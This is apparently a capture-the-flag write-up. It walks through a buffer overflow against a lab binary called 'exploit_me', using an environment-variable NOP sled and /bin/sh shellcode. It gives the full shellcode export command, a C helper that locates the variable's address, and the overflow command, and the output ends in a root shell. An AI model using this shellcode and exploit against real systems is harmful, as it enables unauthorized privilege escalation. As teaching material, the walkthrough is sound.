# NOPSlide to Shellcode execution

Branching off from [Writeup 1, part 6](../../writeup1/part6.md), instead of using a [ret2libc attack](https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3) we could use a [shellcode injection](https://en.wikipedia.org/wiki/Shellcode) from the same buffer overflow. For this to happen, we'll need to do few things, first creating the **SHELLCODE**.

```shell
  $> export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
```

> This shellcode was found [here](https://0xrick.github.io/binary-exploitation/bof5/) but more working ones can be found on [shell-storm](http://shell-storm.org/shellcode/) or [exploit-db](https://www.exploit-db.com/). `\x90` is the OPCode for the [NOP](https://en.wikipedia.org/wiki/NOP_(code)#:~:text=In%20computer%20science%2C%20a%20NOP,protocol%20command%20that%20does%20nothing.) assembly instruction. It does literally nothing, simply telling to go to the next instruction. Chaining `NOP` up until some arbitrary address is called a [NOPSlide](https://en.wikipedia.org/wiki/NOP_slide).

Then, we'll need to find where this environment variable is stored in memory. For that nothing really difficult...

```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
  printf("env address at %p\n", getenv(argv[1]));
  return (0);
}
```

> Simply prints the address of the env variable you gives as first parameter.

Now we retrieve the `SHELLCODE` address, convert it to little-endian and inject it in `exploit_me`.

```shell
  $> gcc -o printAddress find_env_variable.c
  $> ./printAddress SHELLCODE
  env address at 0xbffff864
  $> ./exploit_me `python -c 'print("0"*140 + "\xXX\xXX\xXX\xXX"[::-1])'`
  # id
  uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
  # whoami
  root
```

> We must give an adress (represented by `\xXX\xXX\xXX\xXX` slightly after the one that is given to us by the previous program, to slowly slide into our Shellcode.

One more time, we are root!
